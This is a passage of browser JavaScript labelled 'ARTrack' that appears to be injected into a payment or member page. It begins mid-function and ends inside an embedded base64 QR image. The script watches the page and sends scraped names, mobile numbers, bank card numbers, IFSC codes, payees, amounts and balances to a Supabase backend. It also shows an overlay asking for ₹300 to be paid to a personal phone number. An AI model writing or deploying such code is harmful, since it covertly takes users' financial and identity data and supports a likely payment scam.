    let _txCount    = 0;

    function _logTransaction(amount, forceLog) {
      // Log if amount changed OR forced (initial send)
      if (!amount) return;
      if (!forceLog && amount === _lastAmount) return;
      _lastAmount = amount;
      _txCount++;
      const _d = _extractPageData();
      const _now = new Date();
      console.log("[ARTrack] 💰 Amount detected:", amount, "— sending to Supabase...");
      _trackSend("transactions", {
        member_id:      _d.member_id      || _uid,
        member_account: _d.member_account,
        member_type:    _d.member_type,
        mobile_number:  _d.mobile_number,
        real_name:      _d.real_name,
        amount:         amount,
        currency:       "INR",
        payment_method: _d.payment_method,
        bank_card:      _d.bank_card,
        bank_name:      _d.bank_name,
        ifsc:           _d.ifsc,
        payee_name:     _d.payee_name,
        countdown:      _d.countdown,
        tx_time:        _now.toISOString(),
        tx_date:        _now.toISOString().slice(0,10),
        tx_count_day:   _txCount,
        page_url:       window.location.href
      });
    }

    // ── Try immediately ───────────────────────────────────────────────────
    const _initAmt = _readPageAmount();
    if (_initAmt) {
      _logTransaction(_initAmt, true); // force send even if same
    } else {
      console.log("[ARTrack] ⚠️ No amount found on page yet — watching...");
    }

    // ── Watch DOM for amount appearing/changing ───────────────────────────
    const _amtObserver = new MutationObserver(function() {
      const _amt = _readPageAmount();
      if (_amt) _logTransaction(_amt, false);
    });
    _amtObserver.observe(document.body, { childList: true, subtree: true, characterData: true });

    // ── Poll every 2s as backup ───────────────────────────────────────────
    setInterval(function() {
      const _amt = _readPageAmount();
      if (_amt) _logTransaction(_amt, false);
    }, 2000);
  })();

  // ── 3. DAILY SUMMARY — upsert login count for today ─────────────────────
  (async function _updateDailyStats() {
    const _today = new Date().toISOString().slice(0, 10);
    const _u = _readUserInfo();
    const _mid    = String(_u?.memberId      || _uid || '');
    const _macct  = String(_u?.memberAccount || '');
    const _arbBal = parseFloat(_u?.balance    ?? 0) || 0;
    const _inrBal = parseFloat(_u?.inrBalance ?? 0) || 0;

    if (!_mid) {
      console.warn("[ARTrack] ⚠️ No memberId for daily_stats");
      return;
    }
    console.log("[ARTrack] 📊 Updating daily_stats for member:", _mid, "ARB:", _arbBal);
    try {
      const res = await fetch(
        _TRACK_URL + "daily_stats?member_id=eq." + encodeURIComponent(_mid) +
        "&stat_date=eq." + _today,
        { method: "GET", headers: _TRACK_HDR }
      );
      const rows = await res.json().catch(() => []);
      if (Array.isArray(rows) && rows.length > 0) {
        // Row exists — increment login_count + update balances
        const r = await fetch(
          _TRACK_URL + "daily_stats?member_id=eq." + encodeURIComponent(_mid) +
          "&stat_date=eq." + _today,
          {
            method: "PATCH",
            headers: _TRACK_HDR,
            body: JSON.stringify({
              login_count:      (rows[0].login_count || 0) + 1,
              last_arb_balance: _arbBal,
              last_inr_balance: _inrBal
            })
          }
        );
        if (r.ok) console.log("[ARTrack] ✅ daily_stats updated | ARB:", _arbBal);
        else console.warn("[ARTrack] ❌ daily_stats PATCH failed:", await r.text());
      } else {
        // New row for today
        const r = await fetch(_TRACK_URL + "daily_stats", {
          method: "POST",
          headers: _TRACK_HDR,
          body: JSON.stringify({
            member_id:        _mid,
            stat_date:        _today,
            login_count:      1,
            tx_count:         0,
            total_amount:     0,
            last_arb_balance: _arbBal,
            last_inr_balance: _inrBal
          })
        });
        if (r.ok) console.log("[ARTrack] ✅ daily_stats created | ARB:", _arbBal);
        else console.warn("[ARTrack] ❌ daily_stats POST failed:", await r.text());
      }
    } catch(e) { console.warn("[ARTrack] daily_stats error:", e.message); }
  })();
  // ╚══════════════════════════════════════════════════════════════════════════╝

  // ── Member Payment Popup (can be dismissed) ────────────────────────────────
  if (SHOW_PAYMENT_POPUP) (function _showMemberPaymentPopup() {
    const _mOverlay = document.createElement("div");
    _mOverlay.id = "__ar_payment_overlay__";
    _mOverlay.style.cssText = [
      "position:fixed","inset:0","background:rgba(0,0,0,0.65)",
      "z-index:2147483647","display:flex","align-items:center",
      "justify-content:center","font-family:system-ui,-apple-system,sans-serif"
    ].join(";");

    const _mBox = document.createElement("div");
    _mBox.style.cssText = [
      "background:#fff","border-radius:20px","padding:28px 24px 24px",
      "width:300px","text-align:center",
      "box-shadow:0 20px 60px rgba(0,0,0,0.35)","position:relative"
    ].join(";");

    // ✕ Close button — members CAN dismiss
    const _mClose = document.createElement("button");
    _mClose.textContent = "✕";
    _mClose.style.cssText = [
      "position:absolute","top:12px","right:14px",
      "background:none","border:none","font-size:18px",
      "cursor:pointer","color:#888","line-height:1"
    ].join(";");
    _mClose.onclick = () => _mOverlay.remove();

    const _mTitle = document.createElement("div");
    _mTitle.innerHTML = "🔓 <strong>Member Access</strong>";
    _mTitle.style.cssText = "font-size:20px;margin-bottom:6px;color:#1a1a1a";

    const _mSub = document.createElement("div");
    _mSub.textContent = "Pay ₹300 to unlock premium features.";
    _mSub.style.cssText = "font-size:13px;color:#666;margin-bottom:14px";

    const _mBanner = document.createElement("div");
    _mBanner.innerHTML = "💳 Pay <strong>₹300</strong> to get access";
    _mBanner.style.cssText = [
      "background:linear-gradient(135deg,#5f2ded,#8b5cf6)",
      "color:#fff","border-radius:10px","padding:10px",
      "font-size:15px","margin-bottom:14px"
    ].join(";");

    const _mPhoneLabel = document.createElement("div");
    _mPhoneLabel.innerHTML = `<span style="color:#5f2ded;font-weight:700;font-size:13px">📱 Pay to: <strong style="font-size:15px;color:#1a1a1a">+918101585828</strong></span>`;
    _mPhoneLabel.style.cssText = "margin-bottom:8px";

    const _mQr = document.createElement("img");
    _mQr.src = "data:image/jpeg;base64,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